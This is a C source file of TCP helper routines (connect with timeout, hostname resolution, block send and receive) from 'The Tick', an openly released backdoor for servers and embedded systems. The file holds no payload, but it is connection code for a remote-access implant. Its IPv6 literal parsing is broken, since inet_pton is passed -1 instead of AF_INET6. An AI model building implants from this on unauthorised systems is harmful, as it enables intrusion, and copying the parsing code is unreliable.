/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "tcp.h"
#include "dns.h"

// Helper function on Windows to implement the missing inet_aton().
#ifdef _WIN32
int inet_aton(const char *cp, struct in_addr *addr)
{
    addr->s_addr = inet_addr(cp);
    return (addr->s_addr == INADDR_NONE) ? 0 : 1;
}
#endif

// Helper function to create a blocking socket with keepalive.
int create_socket(int family)
{
    int fd = socket(family, SOCK_STREAM, 0);
#ifndef _WIN32
    if (fd >= 0) {
        int true_val = 1;
        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, (const void *) &true_val, sizeof(true_val));
    }
#endif
    return fd;
}

// Helper function to connect a socket with a connection timeout.
int connect_socket(int fd, const struct sockaddr *sa, size_t count)
{
    int status = 0;

    // This function changes a lot on Windows... *sigh*

#ifdef _WIN32

    // I have no choice but to connect in a blocking manner
    // and hope the OS has a sane timeout default, because
    // async sockets on Windows are just bonkers and I refuse
    // to touch that with a ten foot pole.
    status = connect(fd, sa, count);
    if (status != 0) {
        return -1;
    }

#else

    fd_set fdset;
    struct timeval timeout;
    int fdopts = 0;
    int so_error = -1;
    socklen_t so_error_len = sizeof(so_error);

    // Set the socket in non blocking mode before connecting.
    fdopts = fcntl(fd, F_GETFL, 0);
    fdopts = fdopts | O_NONBLOCK;
    fcntl(fd, F_SETFL, fdopts);

    // Begin connecting the socket. This will not block anymore.
    status = connect(fd, sa, count);
    if (status != 0 && errno != EINPROGRESS) {
        return -1;
    }

    // This will hold the connection timeout value.
    FD_ZERO(&fdset);
    FD_SET(fd, &fdset);
    timeout.tv_sec = 10;    // 10 second timeout
    timeout.tv_usec = 0;

    // Wait for connection or timeout.
    status = select(fd + 1, NULL, &fdset, NULL, &timeout);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, (void *) &so_error, &so_error_len);

    // Revert to blocking mode now that we're done waiting.
    fdopts = fdopts & (~O_NONBLOCK);
    fcntl(fd, F_SETFL, fdopts);

    // Return the connected socket on success, -1 on error.
    if (status != 1 || so_error != 0) {
        return -1;
    }

#endif

    return fd;
}

// Connects to the given hostname and port.
// On error returns -1.
int connect_to_host(const char *hostname, int port)
{
    int fd = -1;
    int family = -1;
    struct sockaddr_in sa;
    struct sockaddr_in6 sa6;

    // First, try resolving the hostname as an IP address.
    // If this works, it saves us a costly call to the DNS resolver.
    int s = inet_pton(AF_INET, hostname, &sa.sin_addr);
    if (s > 0) {
        family = AF_INET;
    } else {
        s = inet_pton(family, hostname, &sa6.sin6_addr);
        if (s > 0) {
            family = AF_INET6;
        }
    }

#if TICK_FEATURES_DNS

    // If DNS is enabled and it was not an IP address, let's resolve the hostname.
    // Note that this means the bot will perform a DNS resolution every time it
    // tries to connect (barring DNS caches). This is desirable; it makes the
    // bot more resilient to DNS failure.
    if (family == -1) {
        char dns_buffer[17];    // we just want one entry
        size_t resp_size = resolve_hostname(
                hostname, dns_buffer, sizeof(dns_buffer), NULL, NULL);
        if (resp_size == 0) {
            LOG("Cannot resolve host %s\n", hostname);
            return -1;
        } else {
            family = dns_buffer[0];
            if (family == AF_INET) {
                memset((void *) &sa, 0, sizeof(sa));
                memcpy((void *) &sa.sin_addr, (void *) &dns_buffer[1], 4);
            } else if (family == AF_INET6) {
                memset((void *) &sa6, 0, sizeof(sa6));
                memcpy((void *) &sa6.sin6_addr, (void *) &dns_buffer[1], 16);
            } else {
                LOG("Internal error\n");
                return -1;
            }
        }
    }

#endif

    // If we still don't have a valid host to connect to, fail.
    if (family == -1) {
        LOG("Invalid IP address: %s\n", hostname);
        return -1;
    }

    // Try to connect to the specified address.
    if (family == AF_INET) {
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        if ( ((fd = create_socket(AF_INET)) < 0) || (connect_socket(fd, (const struct sockaddr *) &sa, sizeof(sa)) < 0) ) {
            LOG("Cannot connect to %s:%d\n", hostname, port);
            return -1;
        }
    } else if (family == AF_INET6) {
        sa6.sin6_family = AF_INET6;
        sa6.sin6_port = htons(port);
        if ( (fd = create_socket(AF_INET6)) < 0 || connect_socket(fd, (const struct sockaddr *) &sa6, sizeof(sa6)) < 0 ) {
            LOG("Cannot connect to %s:%d\n", hostname, port);
            return -1;
        }
    } else {
        LOG("Internal error\n");
        return -1;
    }

    // We are connected, return the socket file descriptor.
    return fd;
}

// Sends a block of data over a TCP socket.
// Does not return until all data has been sent.
// Returns 0 on success or -1 if the connection was interrupted.
int send_block(int fd, const char *buf, size_t count)
{
    ssize_t data_sent = -1;

    while (count > 0) {
        data_sent = send(fd, (const void *) buf, count, 0);
        if (data_sent < 0) {
            LOG("Connection interrupted!\n");
            return -1;
        }
        buf = buf + data_sent;
        count = count - data_sent;
    }
    return 0;
}

// Reads a block of data from a TCP socket.
// Does not return until all data has been read.
// Returns 0 on success or -1 if the connection was interrupted.
int recv_block(int sock, char *buf, size_t count)
{
    ssize_t data_recv = -1;

    while (count > 0) {
        data_recv = recv(sock, (void *) buf, count, 0);
        if (data_recv <= 0) {
            LOG("Connection interrupted!\n");
            return -1;
        }
        buf = buf + data_recv;
        count = count - data_recv;
    }
    return 0;
}

// Consume "count" bytes from socket "fd" and discard them.
// Returns 0 on success, or -1 on error.
int consume_extra_data(int fd, size_t count)
{
    ssize_t bytes = 0;
    char buffer[256];
    while (count != 0) {
        bytes = recv(fd, (void *) &buffer, MIN(sizeof(buffer), count), 0);
        if (bytes <= 0) {
            return -1;
        }
        count = count - (size_t) bytes;
    }
    return 0;
}

// Close a TCP connection in a "nice" way.
void disconnect_tcp(int fd)
{
    if (fd >= 0) {
        shutdown(fd, SHUT_RD);
        close(fd);
    }
}
